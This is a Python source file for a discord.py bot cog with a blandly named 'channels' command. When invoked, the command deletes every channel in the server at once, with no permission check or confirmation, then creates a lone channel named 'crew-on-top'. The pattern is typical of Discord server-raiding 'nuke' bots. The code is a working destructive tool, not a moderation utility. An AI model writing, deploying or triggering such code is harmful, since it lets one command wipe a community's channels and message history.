from discord.ext import commands
import discord
import asyncio

class Channels(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def channels(self, ctx):
        guild = ctx.guild
        
        # Eliminar todos los canales existentes de manera rápida
        await self.delete_all_channels(guild)

    async def delete_all_channels(self, guild):
        channels = guild.channels
        
        # Usar asyncio.gather para eliminar los canales en paralelo
        delete_tasks = [self.delete_channel(channel) for channel in channels]
        
        await asyncio.gather(*delete_tasks)
        
        # Crear un nuevo canal llamado "crew-on-top"
        await guild.create_text_channel("crew-on-top")
        print('Canal "crew-on-top" creado.')

    async def delete_channel(self, channel):
        try:
            await channel.delete()
            print(f'Canal {channel.name} eliminado.')
        except discord.Forbidden:
            print(f'No se puede eliminar el canal {channel.name}. Permisos insuficientes.')
        except discord.HTTPException as e:
            print(f'Error al eliminar el canal {channel.name}: {e}')

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(Channels(bot))
